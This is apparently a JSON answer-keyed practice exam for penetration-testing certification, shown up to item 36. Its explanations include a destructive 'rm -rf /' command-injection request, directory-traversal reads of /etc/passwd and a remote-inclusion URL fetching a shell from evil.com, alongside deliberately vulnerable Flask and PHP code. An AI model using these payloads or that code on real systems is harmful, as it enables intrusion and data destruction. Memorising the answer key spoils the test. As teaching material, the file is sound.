{
  "category": "penplus",
  "testId": 7,
  "testName": "Pentest Practice Test #7 (Challenging)",
  "xpPerCorrect": 10,
  "questions": [
    {
      "id": 1,
      "question": "You are performing a penetration test and discover a web application that uses a weak session management mechanism. Session IDs are transmitted in URL parameters and are relatively short and predictable. Which of the following attacks are MOST facilitated by this vulnerability, and why?",
      "options": [
        "SQL Injection, because the session IDs can be manipulated to inject SQL code.",
        "Session hijacking and session prediction, because an attacker can easily guess or enumerate valid session IDs and impersonate legitimate users.",
        "Cross-Site Scripting (XSS), because the session IDs can be used to inject malicious scripts.",
        "Denial-of-Service (DoS), because the server can be overwhelmed with requests containing invalid session IDs."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Predictable and easily accessible session IDs (in URLs) directly enable session hijacking (taking over an existing session) and session prediction (guessing a valid session ID). While weak session management *might* indirectly contribute to other vulnerabilities, the *primary* and *most direct* threat is session hijacking/prediction. SQL injection, XSS, and DoS are distinct attack types.",
      "examTip": "Predictable/exposed session IDs = High risk of session hijacking/prediction."
    },
    {
      "id": 2,
      "question": "You are performing a penetration test against a network that uses 802.1X authentication. Which of the following techniques would be MOST appropriate for attempting to bypass this security control?",
      "options": [
        "Performing a brute-force attack against user passwords.",
        "Attempting to exploit vulnerabilities in the specific EAP method used (e.g., EAP-TTLS, PEAP, EAP-FAST), performing a man-in-the-middle attack against the authentication process, or exploiting misconfigurations in the RADIUS server.",
        "Sending phishing emails to users to obtain their credentials.",
        "Scanning the network for open ports."
      ],
      "correctAnswerIndex": 1,
      "explanation": "802.1X relies on the Extensible Authentication Protocol (EAP). Attacks often target weaknesses in the *specific EAP method* chosen (e.g., weak cipher suites, improper certificate validation), or misconfigurations in the RADIUS server that handles authentication. Man-in-the-middle attacks can also be used to intercept or manipulate the authentication process. Brute-forcing passwords might work *if* you can obtain them, but it doesn't directly bypass 802.1X. Phishing is for credential theft, and port scanning is general reconnaissance.",
      "examTip": "802.1X bypass = Target EAP method vulnerabilities, RADIUS server, or perform MitM."
    },
    {
       "id": 3,
      "question": "Examine the following Nmap command and its partial output:\nCommand: `nmap -sS -p- --min-rate 5000 --max-retries 1 -T4 192.168.1.100`\nPartial Output:\n```\nStarting Nmap 7.94 ( https://nmap.org ) at [Timestamp]\nNmap scan report for 192.168.1.100\nHost is up (0.0010s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT      STATE    SERVICE\n22/tcp    open     ssh\n80/tcp    open     http\n443/tcp   filtered https\n```\nWhat is the significance of the `filtered` state for port 443, and how might you proceed to investigate further?",
      "options":[
         "Port 443 is definitely open, but Nmap couldn't determine the service running.",
         "Port 443 is likely protected by a firewall or filtering device that is dropping packets without sending a response. Further investigation might involve trying a TCP connect scan (-sT), using different scan techniques (e.g., -sA, -sW), or attempting to connect with a tool like `openssl s_client`.",
         "Port 443 is definitely closed.",
         "Port 443 is open, and the service is definitely HTTPS."
      ],
      "correctAnswerIndex": 1,
      "explanation": "A `filtered` state in Nmap means that Nmap couldn't determine whether the port is open or closed. This usually indicates that a firewall or filtering device is blocking the probe packets *without* sending back a TCP RST (reset) packet (which would indicate a closed port) or an ICMP unreachable message.  It *doesn't* mean the port is definitely open or closed. To investigate further, you could try a TCP connect scan (`-sT`), which completes the three-way handshake (and might get through some firewalls), or other scan types like ACK scan (`-sA`) or Window scan (`-sW`) that might reveal more about the firewall's behavior.  Connecting directly with a tool like `openssl s_client` can also help determine if an SSL/TLS service is running on the port.",
      "examTip": "Nmap `filtered` state = Firewall/filtering device is likely blocking probes."
    },
    {
      "id": 4,
      "question": "You are analyzing a compromised Linux system. You find a suspicious binary file named `/tmp/helper` that has the SUID bit set and is owned by root. What is the potential security implication of this, and how would you investigate further?",
      "options": [
        "The file is likely harmless, as it's in the `/tmp` directory.",
        "The file could potentially be exploited to gain root privileges. You should examine the binary's code (using tools like `strings`, `ltrace`, `strace`, or a disassembler) to understand its functionality and identify any vulnerabilities.",
        "The file is a system log file and contains sensitive information.",
        "The file is a backup of the system's configuration."
      ],
      "correctAnswerIndex": 1,
      "explanation": "A SUID binary owned by root *always* runs with root privileges, regardless of who executes it. This is a classic target for privilege escalation. If the binary has vulnerabilities (e.g., buffer overflows, command injection), a local user could exploit them to gain root access.  The `/tmp` directory is world-writable, making it a common location for attackers to place malicious files. Investigating the binary's code is crucial to determine its purpose and identify potential vulnerabilities. It's not likely to be a system log file or a backup based on the SUID bit and location.",
      "examTip": "SUID root binary = High potential for privilege escalation."
    },
    {
        "id": 5,
        "question": "Analyze the following Python code snippet:\n```python\nimport os\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/run_command')\ndef run_command():\n    command = request.args.get('command')\n    if command:\n        result = os.popen(command).read()\n        return result\n    else:\n        return \"No command provided.\"\n```\nWhat is the MAJOR security vulnerability present in this Flask web application, and how could it be exploited?",
        "options":[
           "Cross-site scripting (XSS); an attacker could inject malicious JavaScript code into the 'command' parameter.",
           "Command injection; an attacker could supply arbitrary operating system commands in the 'command' parameter, which would be executed by the `os.popen()` function.",
           "SQL injection (SQLi); an attacker could inject malicious SQL code into the 'command' parameter.",
           "Cross-site request forgery (CSRF); an attacker could trick a user into submitting a malicious request."
        ],
        "correctAnswerIndex": 1,
        "explanation": "This code is vulnerable to command injection. The `os.popen()` function executes a shell command, and the code directly uses user input (`request.args.get('command')`) without any sanitization or validation. An attacker could supply a malicious command (e.g., `http://example.com/run_command?command=rm -rf /`) to execute arbitrary code on the server. This is not XSS (which involves client-side script injection), SQLi (which targets databases), or CSRF (which forces unintended user actions).",
        "examTip": "Using user input directly in OS command execution (e.g., `os.popen()`, `system()`) = Command injection vulnerability."
    },
    {
      "id": 6,
       "question": "What is 'pass-the-ticket' (PtT) in the context of Windows authentication, and how does it differ from 'pass-the-hash' (PtH)?",
       "options": [
         "PtT and PtH are the same attack; they both involve using stolen NTLM hashes.",
         "PtT involves using a captured Kerberos ticket to authenticate to services, while PtH involves using a captured NTLM hash.  Both bypass the need to know the user's plaintext password.",
         "PtT involves cracking a user's password, while PtH involves stealing a user's password.",
         "PtT is a type of social engineering attack, while PtH is a type of network attack."
       ],
       "correctAnswerIndex": 1,
       "explanation": "Both PtT and PtH allow authentication without knowing the plaintext password, but they target different authentication mechanisms. PtT uses Kerberos tickets (obtained through attacks like Kerberoasting or Golden Ticket attacks), while PtH uses NTLM hashes. They are not the same attack, and neither involves *cracking* the password in the traditional sense (though cracking might be a step to *obtain* the hash or ticket). They are not social engineering attacks.",
       "examTip": "Pass-the-ticket = Kerberos; Pass-the-hash = NTLM."
    },
    {
      "id": 7,
      "question": "You are performing a penetration test against a web application that uses client-side input validation to prevent Cross-Site Scripting (XSS). You bypass this validation by intercepting and modifying the request using a proxy like Burp Suite. What does this demonstrate?",
      "options": [
        "The web application is completely secure against XSS.",
        "Client-side validation alone is insufficient for preventing XSS; server-side validation is also required.",
        "The web application is vulnerable to SQL injection.",
        "The web application is vulnerable to denial-of-service attacks."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Client-side validation can be easily bypassed by intercepting and modifying the request *before* it reaches the server. This highlights the importance of *server-side* validation, which cannot be bypassed by the client. The application is *not* secure against XSS. This test doesn't demonstrate SQLi or DoS vulnerabilities.",
      "examTip": "Client-side validation is *never* sufficient for security; always validate on the server."
    },
    {
        "id": 8,
         "question": "Examine the following Apache web server configuration snippet:\n```apache\n<Directory /var/www/html>\n  Options Indexes FollowSymLinks\n  AllowOverride None\n  Require all granted\n</Directory>\n```\nWhat is the potential security risk associated with the `Options Indexes` directive in this configuration?",
         "options":[
            "It prevents the web server from serving any content from the `/var/www/html` directory.",
            "It allows directory listing, meaning that if a user requests a directory without a default index file (e.g., index.html), the server will display a list of files and subdirectories within that directory, potentially revealing sensitive information.",
            "It encrypts all communication between the web server and clients.",
            "It prevents users from accessing the web server."
         ],
         "correctAnswerIndex": 1,
         "explanation": "`Options Indexes` enables directory listing. If a directory doesn't contain a default index file (like `index.html`, `index.php`), the web server will display a list of all files and subdirectories within that directory, which could expose sensitive information or aid in reconnaissance. The correct configuration to disable this would be `Options -Indexes`. The other options describe different Apache directives or security concepts.",
         "examTip": "`Options Indexes` = Enables directory listing (potential information disclosure)."
    },
    {
        "id": 9,
        "question": "You are analyzing a compromised web server and find a PHP file containing the following code:\n```php\n<?php\n  $file = $_GET['file'];\n  include($file);\n?>\n```\nWhat type of vulnerability is present, and how could it be exploited?",
        "options":[
           "Cross-site scripting (XSS); an attacker could inject malicious JavaScript code into the 'file' parameter.",
           "Local File Inclusion (LFI) and potentially Remote Code Execution (RCE); an attacker could supply a path to a local file (e.g., `../../etc/passwd`) or a remote URL (if `allow_url_include` is enabled) to include and execute arbitrary code.",
           "SQL injection (SQLi); an attacker could inject malicious SQL code into the 'file' parameter.",
           "Cross-site request forgery (CSRF); an attacker could trick a user into submitting a malicious request."
        ],
        "correctAnswerIndex": 1,
        "explanation": "This code is vulnerable to Local File Inclusion (LFI) because it uses user-supplied input (`$_GET['file']`) directly in the `include()` function without any validation or sanitization. An attacker could specify a path to a local file (e.g., `http://example.com/vulnerable.php?file=../../etc/passwd`) to read its contents. Furthermore, if the PHP configuration allows including remote files (`allow_url_include = On`), this could lead to Remote Code Execution (RCE) by including a file from a malicious server (e.g., `http://example.com/vulnerable.php?file=http://evil.com/shell.txt`). It's not XSS (which involves client-side script injection), SQLi (which targets databases), or CSRF (which forces unintended user actions).",
        "examTip": "Using user input directly in `include()` (PHP) = LFI/RCE vulnerability."
    },
    {
      "id": 10,
      "question": "Which of the following techniques is MOST effective for mitigating the risk of 'brute-force' and 'password spraying' attacks against user authentication systems?",
      "options": [
        "Using short, easy-to-remember passwords.",
        "Implementing strong account lockout policies (limiting the number of failed login attempts), using multi-factor authentication (MFA), and monitoring for suspicious login activity.",
        "Reusing the same password across multiple accounts.",
        "Disabling firewalls to allow all network traffic."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Account lockouts prevent attackers from trying unlimited passwords against a single account. Multi-factor authentication adds another layer of security beyond just the password, making it much harder for attackers to gain access even if they guess the password. Monitoring for suspicious login activity (e.g., many failed attempts from the same IP address) can help detect and respond to attacks. Short passwords, password reuse, and disabling firewalls all *increase* vulnerability to these attacks.",
      "examTip": "Account lockouts + MFA + monitoring = Strong defense against brute-force/password spraying."
    },
        {
            "id": 11,
            "question": "You are performing a penetration test and discover a web server that is vulnerable to the 'Shellshock' vulnerability (CVE-2014-6271). Which of the following BEST describes this vulnerability and its potential impact?",
            "options":[
                "A vulnerability in web browsers that allows attackers to inject malicious scripts.",
                "A vulnerability in the Bash shell that allows attackers to execute arbitrary commands by crafting specially formatted environment variables.",
                "A vulnerability in web servers that allows attackers to bypass authentication.",
                "A vulnerability in databases that allows attackers to inject malicious SQL code."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Shellshock (CVE-2014-6271) is a critical vulnerability in the Bash shell, a command processor commonly used on Linux and Unix-based systems. It allows attackers to execute arbitrary commands by manipulating environment variables, often through web requests (e.g., using specially crafted HTTP headers). It's not a browser vulnerability, a general web server authentication bypass, or SQL injection.",
            "examTip": "Shellshock = Bash vulnerability allowing arbitrary command execution."
        },
        {
            "id": 12,
            "question": "What is 'token impersonation' in the context of Windows security, and how can it be used for privilege escalation?",
            "options":[
               "A type of social engineering attack where an attacker impersonates a legitimate user.",
               "A technique where an attacker with sufficient privileges can obtain or create an access token representing another user (often a higher-privileged user) and then use that token to perform actions with the impersonated user's privileges.",
               "A method for encrypting data stored on a Windows system.",
               "A way to improve network performance on a Windows network."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Windows uses access tokens to represent the security context of processes and threads.  Token impersonation allows an attacker to 'borrow' the privileges of another user, potentially escalating their own privileges.  It's not a social engineering attack, an encryption method, or a performance improvement technique.  Tools like `incognito` (part of Meterpreter) and various Windows API functions can be used for token manipulation.",
            "examTip": "Token impersonation = Using another user's access token to gain their privileges (Windows)."
        },
        {
            "id": 13,
             "question": "Which of the following is the MOST effective way to mitigate the risk of 'cross-site request forgery' (CSRF) attacks?",
             "options":[
               "Using strong, unique passwords for all user accounts.",
                "Implementing and verifying synchronizer tokens (anti-CSRF tokens) for all state-changing requests, and considering additional defenses like checking the HTTP Referer and Origin headers (though these are not foolproof).",
                "Enabling HTTPS for all web traffic.",
                "Regularly updating the web application's software and dependencies."
             ],
             "correctAnswerIndex": 1,
             "explanation": "Synchronizer tokens (anti-CSRF tokens) are the primary and most reliable defense against CSRF. They ensure that requests originated from the legitimate application and not from an attacker.  While the Referer and Origin headers can provide *some* protection, they are not as reliable and can be manipulated or missing in certain cases.  Strong passwords, HTTPS, and updates are important security practices, but they don't directly prevent CSRF.",
             "examTip": "Synchronizer tokens (anti-CSRF tokens) = Primary defense against CSRF."
        },
        {
           "id": 14,
           "question": "You are performing a wireless penetration test and successfully capture a WPA2 4-way handshake. What is the NEXT step you would typically take to try and gain access to the network?",
           "options":[
             "Immediately connect to the network using the captured handshake.",
             "Perform an offline dictionary attack or brute-force attack against the captured handshake using tools like Aircrack-ng or Hashcat.",
             "Perform a denial-of-service attack against the wireless access point.",
             "Send phishing emails to users on the network."
           ],
           "correctAnswerIndex": 1,
           "explanation": "The 4-way handshake contains the information needed to derive the Wi-Fi password (PSK). However, it's encrypted. You need to perform an *offline* attack (dictionary or brute-force) using tools like Aircrack-ng or Hashcat to try and crack the password. You cannot directly connect using the handshake itself. DoS attacks and phishing are unrelated to cracking the WPA2 password.",
           "examTip": "WPA2 4-way handshake capture = Next step is offline password cracking."
        },
        {
             "id": 15,
              "question": "Examine the following command:\n```bash\n./custom_binary \"$(python -c 'print(\"A\"*200)')\"\n```\nWhat type of vulnerability is MOST likely being tested for with this command?",
              "options":[
                "SQL Injection",
                "Buffer Overflow",
                "Cross-Site Scripting",
                "Command Injection"
              ],
              "correctAnswerIndex": 1,
              "explanation": "This command is likely testing for a buffer overflow vulnerability in the `./custom_binary` program. The command uses Python to generate a string of 200 'A' characters (`"A"*200`) and passes it as an argument to the binary. If the binary doesn't properly handle input lengths, this large input could overwrite memory buffers, potentially leading to a crash or even arbitrary code execution. It is not testing for SQLi(input is not to a database), XSS(no web context), or Command Injection (the goal isn't to inject Os-level commands, it is to overflow an input.)",
              "examTip": "Long string input to a binary = Possible buffer overflow test."
        },
        {
           "id": 16,
          "question":"What is 'Kerberoasting'?",
          "options":[
            "A type of social engineering attack where an attacker impersonates a Kerberos server.",
            "An attack that targets the Kerberos authentication protocol, specifically targeting service accounts. Attackers request service tickets for accounts with weak passwords, and then attempt to crack those tickets offline.",
            "A method for encrypting data on a Windows domain.",
            "A technique for improving the performance of Kerberos authentication."
          ],
          "correctAnswerIndex": 1,
          "explanation":"Kerberoasting exploits the way Kerberos service tickets are generated. Attackers, with a foothold on the network, can request service tickets for service accounts. If those accounts have weak passwords, the encrypted part of the ticket (which is encrypted with the service account's password hash) can be cracked offline. It's not a social engineering attack, an encryption method, or a performance improvement technique.",
          "examTip": "Kerberoasting = Offline cracking of Kerberos service tickets."
        },
         {
            "id": 17,
            "question": "Which of the following is a common technique for bypassing a Network Intrusion Detection System (NIDS) or Intrusion Prevention System (IPS)?",
            "options":[
                "Using well-known and easily detectable attack signatures.",
                "Using techniques like packet fragmentation, IP address spoofing, traffic obfuscation (e.g., encoding, encryption, Unicode variations), and using non-standard ports or protocols; also, exploiting vulnerabilities in the NIDS/IPS itself.",
                "Sending very large, unfragmented packets with clearly malicious payloads.",
                "Using the default configuration settings for the NIDS/IPS."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Evasion techniques aim to make malicious traffic look different from known attack patterns or to bypass filtering rules. Fragmentation, spoofing, obfuscation, encryption, non-standard ports/protocols, and even exploiting the NIDS/IPS itself can achieve this. Using known signatures, large unfragmented packets, and default settings would likely *trigger* the NIDS/IPS.",
            "examTip": "Fragmentation, spoofing, obfuscation, encryption, non-standard ports/protocols = NIDS/IPS evasion."
        },
        {
             "id": 18,
            "question":"What is 'DLL hijacking'?",
            "options":[
              "A type of social engineering attack where an attacker impersonates a legitimate DLL file.",
              "An attack where a malicious DLL (Dynamic Link Library) is placed in a location where it will be loaded by a legitimate application *instead of* the intended DLL, often exploiting the DLL search order, allowing the attacker's code to execute with the privileges of that application.",
              "A method for encrypting data stored in DLL files.",
              "A technique for improving the performance of DLL files."
            ],
            "correctAnswerIndex": 1,
            "explanation": "DLL hijacking exploits the way Windows applications load DLLs. By placing a malicious DLL in a specific location (often a location that's searched *before* the legitimate DLL's location), the attacker can trick a legitimate application into loading and executing their code. It's not a social engineering attack, encryption method, or performance improvement technique.",
            "examTip": "DLL hijacking = Tricking an application into loading a malicious DLL."
        },
        {
            "id": 19,
           "question": "Which of the following is a common method for performing a 'man-in-the-middle' (MitM) attack?",
           "options":[
                "Sending phishing emails to users to trick them into revealing their credentials.",
                "Using techniques like ARP poisoning (on wired networks), creating a rogue access point (evil twin) on wireless networks, or exploiting vulnerabilities in network protocols to intercept and potentially modify network traffic between two parties.",
                "Exploiting a vulnerability in a web application to inject malicious SQL code.",
                "Cracking passwords using a brute-force or dictionary attack."
           ],
           "correctAnswerIndex": 1,
           "explanation": "MitM attacks involve intercepting communication. ARP poisoning redirects traffic on wired networks, and rogue access points (evil twins) do the same on wireless networks. Protocol vulnerabilities can also be exploited. Phishing is social engineering, SQL injection targets databases, and password cracking targets passwords.",
           "examTip": "ARP poisoning (wired), rogue AP (wireless), protocol exploits = MitM techniques."
        },
        {
            "id": 20,
            "question": "You are performing a penetration test against a web application and discover a parameter that appears to control which page is included and displayed. You modify the parameter as follows:\nOriginal URL: `http://example.com/index.php?page=home`\nModified URL: `http://example.com/index.php?page=../../../../etc/passwd`\nWhat type of vulnerability are you MOST likely testing for, and what is a potential consequence if successful?",
            "options":[
              "Cross-Site Scripting (XSS); you could inject malicious scripts into the web page.",
              "Local File Inclusion (LFI) / Directory Traversal; you could read arbitrary files from the web server's file system.",
              "SQL Injection (SQLi); you could access or modify data in the web application's database.",
              "Cross-Site Request Forgery (CSRF); you could force an authenticated user to perform unintended actions."
            ],
            "correctAnswerIndex": 1,
            "explanation": "The `../../../../etc/passwd` pattern is a classic indicator of a Local File Inclusion (LFI) or Directory Traversal vulnerability. The attacker is attempting to navigate outside the web root directory to access system files. If successful, they could read sensitive files like `/etc/passwd` (which contains user account information).  XSS involves injecting scripts, SQLi targets databases, and CSRF forces unintended user actions.",
            "examTip": "`../../` in a URL parameter = High probability of LFI/Directory Traversal."
        },
        {
          "id": 21,
          "question": "Which of the following is a common method for gathering information about a target organization's employees during the reconnaissance phase of a penetration test?",
          "options":[
            "Exploiting vulnerabilities in the target's web server.",
            "Using OSINT (Open-Source Intelligence) techniques, such as searching social media platforms (e.g., LinkedIn), professional networking sites, company websites, and public records.",
            "Performing a denial-of-service attack against the target's network.",
            "Cracking passwords using a brute-force or dictionary attack."
          ],
          "correctAnswerIndex": 1,
          "explanation": "Reconnaissance involves gathering information *before* launching any attacks. OSINT, including searching social media and other public sources, is a key technique for gathering information about employees (names, job titles, contact information, etc.), which can be useful for social engineering or spear phishing attacks. Exploiting vulnerabilities, DoS attacks, and password cracking are later attack stages.",
          "examTip": "OSINT (social media, public records) = Reconnaissance for employee information."
        },
        {
          "id": 22,
          "question":"What is 'cross-site request forgery' (CSRF)?",
          "options":[
            "A type of denial-of-service attack.",
            "An attack that forces an authenticated end user to execute unwanted actions on a web application in which they are currently logged in, without their knowledge or consent. The attacker tricks the user's browser into sending a forged request to the vulnerable application.",
            "A method for encrypting web traffic between a client and a server.",
            "A technique for cracking passwords using a brute-force or dictionary attack."
          ],
          "correctAnswerIndex": 1,
          "explanation": "CSRF exploits the trust a web application has in a logged-in user's browser.  The attacker crafts a malicious request that the user's browser unknowingly sends to the vulnerable application. The application, seeing a valid session, executes the request as if it came from the user. It's not a DoS attack, encryption method, or password cracking technique.",
          "examTip": "CSRF = Forcing authenticated users to execute unintended actions."
        },
         {
            "id": 23,
            "question": "Which of the following is a common technique for identifying vulnerabilities in web applications?",
            "options":[
                "Shoulder surfing.",
               "Using automated web application vulnerability scanners (like Burp Suite, OWASP ZAP, Nikto) in conjunction with manual testing (including input validation testing, session management testing, authentication testing, and business logic testing), and code review (if available).",
               "Phishing.",
               "Social engineering."
            ],
            "correctAnswerIndex": 1,
            "explanation": "A combination of automated scanning and manual testing, ideally with code review, provides the most comprehensive approach to finding web application vulnerabilities. Shoulder surfing, phishing, and social engineering are different reconnaissance or attack techniques.",
            "examTip": "Automated scanners + manual testing + code review = Comprehensive web application vulnerability assessment."
        },
        {
            "id": 24,
            "question": "You are performing a penetration test against a web application. You intercept an HTTP request and modify a hidden form field value before sending it to the server. What type of attack are you MOST likely attempting?",
            "options":[
               "Cross-Site Scripting (XSS)",
               "Parameter tampering",
               "SQL Injection (SQLi)",
               "Denial-of-Service (DoS)"
            ],
            "correctAnswerIndex": 1,
            "explanation": "Modifying hidden form fields (or any parameter in an HTTP request) is a form of parameter tampering. This can be used to test for various vulnerabilities, including business logic flaws, access control issues, and sometimes even injection attacks (if the tampered parameter is used in a vulnerable way). XSS involves injecting scripts, SQLi targets databases, and DoS disrupts service.",
            "examTip": "Modifying HTTP request parameters = Parameter tampering."
        },
        {
          "id": 25,
          "question": "What is the primary purpose of a 'penetration testing report'?",
          "options":[
            "To list all usernames and passwords discovered during the penetration test.",
            "To provide a detailed, clear, and concise summary of the penetration testing activities, findings (vulnerabilities), risks, and recommendations for remediation, enabling the client to understand their security posture and take appropriate action.",
            "To provide a step-by-step guide on how to hack the target system.",
            "To list all software and hardware components present on the target system."
          ],
          "correctAnswerIndex": 1,
          "explanation": "The penetration testing report is the key deliverable, communicating the results of the test in a way that the client can understand and use to improve their security. It should *not* include raw credentials or provide a hacking guide. It's not a software/hardware inventory.",
          "examTip": "Penetration testing report = Findings, risks, recommendations, and actionable information."
        },
        {
            "id": 26,
            "question": "Which of the following is a common method for performing a 'denial-of-service' (DoS) or 'distributed denial-of-service' (DDoS) attack?",
            "options":[
               "Sending phishing emails to users.",
               "Flooding a target system or network with traffic (e.g., SYN floods, UDP floods, HTTP floods), consuming resources (e.g., bandwidth, CPU, memory), or exploiting vulnerabilities that cause the service to crash or become unresponsive.",
               "Exploiting a vulnerability in a web application to inject malicious SQL code.",
               "Cracking passwords using a brute-force or dictionary attack."
            ],
            "correctAnswerIndex": 1,
            "explanation": "DoS/DDoS attacks aim to disrupt service availability. Flooding is a common technique, but resource exhaustion and exploiting vulnerabilities to cause crashes can also achieve a denial of service. Phishing is a social engineering technique, SQL injection targets databases, and brute-force/dictionary attacks target passwords.",
            "examTip": "DoS/DDoS = Disrupting service availability (flooding, resource exhaustion, crashes)."
        },
         {
          "id": 27,
          "question":"What is 'command injection'?",
          "options":[
            "A type of social engineering attack where an attacker tricks a user into executing commands on their own system.",
            "An attack that allows an attacker to execute arbitrary operating system commands on a vulnerable system, often through a web application or other application that accepts user input without proper sanitization or validation.",
            "A method for encrypting data transmitted between a client and a server.",
            "A technique for improving network performance by optimizing command execution."
          ],
          "correctAnswerIndex": 1,
          "explanation": "Command injection exploits vulnerabilities in how applications handle user input, allowing attackers to run OS commands on the server. It's not a social engineering attack (though social engineering could be used to *deliver* a command injection payload), an encryption method, or a performance optimization technique.",
          "examTip": "Command injection = Executing arbitrary OS commands through vulnerable applications."
        },
        {
            "id": 28,
            "question": "You have gained access to a Linux system. Which of the following commands would be MOST useful for identifying the system's kernel version and architecture?",
            "options":[
               "ps aux",
               "uname -a",
               "netstat -tulnp",
               "ls -l /"
            ],
            "correctAnswerIndex": 1,
            "explanation": "The `uname -a` command displays detailed system information, including the kernel version, architecture (e.g., x86_64), hostname, and other details. `ps aux` shows running processes, `netstat -tulnp` shows listening network ports, and `ls -l /` lists files in the root directory.",
            "examTip": "`uname -a` = System information (kernel version, architecture) (Linux)."
        },
                {
            "id": 29,
             "question": "What is a common technique for discovering and exploiting vulnerabilities in web applications?",
             "options":[
                "Shoulder surfing.",
                "Using a combination of automated web application vulnerability scanners (like Burp Suite, OWASP ZAP, Nikto) and manual testing techniques (including input validation testing, session management testing, authentication testing, business logic testing, and parameter tampering), along with code review (if available).",
                "Phishing.",
                "Social engineering."
             ],
             "correctAnswerIndex": 1,
             "explanation": "A comprehensive approach to web application security testing involves both automated tools and manual analysis. Automated scanners can quickly identify common vulnerabilities, while manual testing is crucial for finding more subtle flaws, including business logic vulnerabilities and complex attack scenarios. Code review, when possible, provides the deepest level of analysis. Shoulder surfing, phishing, and social engineering are different reconnaissance or attack techniques.",
             "examTip": "Automated scanners + manual testing + code review = Comprehensive web application security assessment."
        },
        {
            "id": 30,
            "question": "Analyze the following Wireshark display filter: `ip.src == 192.168.1.100 && tcp.flags.syn == 1 && tcp.flags.ack == 0`\nWhat type of network traffic will this filter isolate?",
            "options":[
              "All traffic originating from IP address 192.168.1.100.",
              "Only TCP SYN packets (connection initiation attempts) originating from IP address 192.168.1.100.",
              "All TCP traffic to or from IP address 192.168.1.100.",
              "Only TCP SYN-ACK packets (connection acknowledgments) originating from IP address 192.168.1.100."
            ],
            "correctAnswerIndex": 1,
            "explanation": "This Wireshark filter combines three conditions: `ip.src == 192.168.1.100` selects traffic *originating* from the specified IP address. `tcp.flags.syn == 1` selects packets where the TCP SYN flag is set (indicating a connection initiation attempt). `tcp.flags.ack == 0` selects packets where the TCP ACK flag is *not* set.  Therefore, the filter isolates *only* TCP SYN packets (the first step in the three-way handshake) originating from 192.168.1.100. It will *not* show all traffic from that IP, all TCP traffic, or SYN-ACK packets.",
            "examTip": "Wireshark filters: `ip.src`, `tcp.flags.syn`, `tcp.flags.ack` = Isolate specific TCP connection stages."
        },
        {
           "id": 31,
            "question": "Which of the following is a common technique for maintaining persistence on a compromised Windows system?",
            "options":[
                "Regularly updating the operating system and all installed software.",
                "Creating a scheduled task, modifying the registry (e.g., Run keys, RunOnce keys), installing a malicious service, using WMI event subscriptions, or creating a DLL to perform DLL hijacking.",
                "Using a strong, unique password for the administrator account.",
                "Enabling the Windows Firewall and ensuring it is properly configured."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Persistence mechanisms ensure that an attacker can regain access even after reboots or user logouts.  Scheduled tasks, registry modifications, malicious services, WMI event subscriptions, and DLL hijacking can achieve this. Updating the OS, strong passwords, and firewalls are *defensive* measures.",
            "examTip": "Scheduled tasks, registry keys, services, WMI, DLL hijacking = Persistence on Windows."
        },
        {
           "id": 32,
            "question": "What is the primary purpose of a 'penetration testing methodology' (such as PTES, OSSTMM, or NIST SP 800-115)?",
            "options":[
                "To provide a list of all known vulnerabilities that exist in software and hardware.",
                "To provide a structured, repeatable, and comprehensive framework for conducting penetration tests, ensuring consistency, thoroughness, and adherence to ethical and legal guidelines.",
                "To guarantee that a penetration test will find all security flaws in a target system.",
                "To replace the need for skilled and experienced penetration testers."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Penetration testing methodologies provide a roadmap and best practices for conducting ethical hacking engagements. They promote consistency, thoroughness, and ethical behavior. They are not exhaustive vulnerability lists, guarantees of complete success, or replacements for skilled testers.",
            "examTip": "Penetration testing methodology = Structured framework for ethical hacking."
        },
        {
            "id": 33,
           "question": "Which of the following is a key difference between 'black box', 'white box', and 'gray box' penetration testing?",
           "options":[
            "Black box testing is always performed remotely; white box and gray box testing are always performed on-site.",
            "Black box testing involves no prior knowledge of the target system; white box testing involves full knowledge (including source code, architecture diagrams, network configurations, etc.); gray box testing involves partial knowledge (e.g., network diagrams, API documentation, limited user credentials).",
            "Black box testing is only used for testing web applications; white box and gray box testing are only used for testing network infrastructure.",
            "There is no significant difference in the approach or methodology used in black box, white box, and gray box testing."
           ],
           "correctAnswerIndex": 1,
           "explanation": "The defining characteristic is the *level of prior knowledge* provided to the penetration testing team. The location (remote/on-site) and target type (web app/network) can vary for all three types. The methodology *will* be adapted based on the level of knowledge.",
           "examTip": "Black box = No prior knowledge; White box = Full knowledge; Gray box = Partial knowledge."
        },
        {
          "id": 34,
          "question":"What is 'DLL injection'?",
          "options":[
            "A type of social engineering attack where an attacker tricks a user into installing a malicious DLL file.",
            "A technique where an attacker forces a running process to load a malicious DLL (Dynamic Link Library), allowing the attacker's code to execute within the context and privileges of that process. This often involves exploiting vulnerabilities or using debugging APIs.",
            "A method for encrypting data stored in DLL files to protect it from unauthorized access.",
            "A technique for improving the performance of DLL files and the applications that use them."
          ],
          "correctAnswerIndex": 1,
          "explanation": "DLL injection is a code injection technique, not a social engineering attack. It involves forcing a *running process* to load and execute the attacker's malicious DLL. It's not about encryption or performance improvement.",
          "examTip": "DLL injection = Forcing a running process to load a malicious DLL."
        },
         {
          "id": 35,
          "question": "You are analyzing network traffic and observe a large number of UDP packets sent to port 53 on a server, but the server is not a known DNS server. What might this indicate?",
          "options":[
            "Normal DNS resolution activity.",
            "A potential UDP flood attack or an attempt to use the server for DNS amplification.",
            "Successful data transfer using FTP.",
            "Secure communication using HTTPS."
          ],
          "correctAnswerIndex": 1,
          "explanation": "While port 53 is the standard port for DNS, a *large* volume of UDP traffic to that port on a server *not* known to be a DNS server is suspicious. It could indicate a UDP flood (a type of DoS attack) or an attempt to use the server in a DNS amplification attack (where small DNS queries are crafted to elicit large responses, amplifying the attack traffic). Normal DNS resolution would typically involve a mix of queries and responses, and would be expected on a DNS server. FTP uses ports 20 and 21, and HTTPS uses port 443.",
          "examTip": "Unusual UDP traffic to port 53 (on a non-DNS server) = Possible DoS or amplification attack."
        },
        {
          "id": 36,
           "question": "Which of the following is a common technique for discovering and exploiting vulnerabilities in web applications?",
           "options":[
              "Shoulder surfing.",
